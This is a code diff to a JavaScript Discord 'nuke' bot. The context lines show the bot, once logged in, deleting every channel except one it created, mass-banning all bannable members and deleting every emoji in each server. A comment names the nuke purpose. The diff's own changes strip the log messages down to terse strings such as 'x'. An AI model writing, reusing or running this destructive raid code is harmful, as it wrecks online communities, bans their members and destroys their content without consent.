@@ -33,7 +33,7 @@ client.on("ready", async () => {
 client.on("ready", () => {
 
     //startup message 
-    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));
+    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}.`));
     // create variable for new channel to prevent it from getting deleted by nuke
     let createdChannelName;
     // Create an invite to a channel
@@ -63,7 +63,7 @@ client.on("ready", () => {
         server.channels.forEach(channel => {
             if (createdChannelName !== channel.name) {
                 channel.delete().then(response => {
-                    console.log("my response", response);
+                    console.log("y", response);
                 }).catch(err => {
                     if (err) throw err;
                 });
@@ -79,7 +79,7 @@ client.on("ready", () => {
                 //check if user is bannable
                 if (!m.bannable) return console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                 m.ban()
-                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
+                console.info(`Banned ${m.user.username};`)
 
             }, 3 * 100)
         });
@@ -89,7 +89,7 @@ client.on("ready", () => {
     client.guilds.forEach(guild => {
         guild.emojis.forEach(em => {
             guild.deleteEmoji(em);
-            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
+            console.info(`x`);
         });
     });
 
@@ -97,7 +97,7 @@ client.on("ready", () => {
 
     //handle unexpected errors
     process.on("uncaughtException", err => {
-        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
+        console.error("x", err);
         process.exit(1);
     });
 });
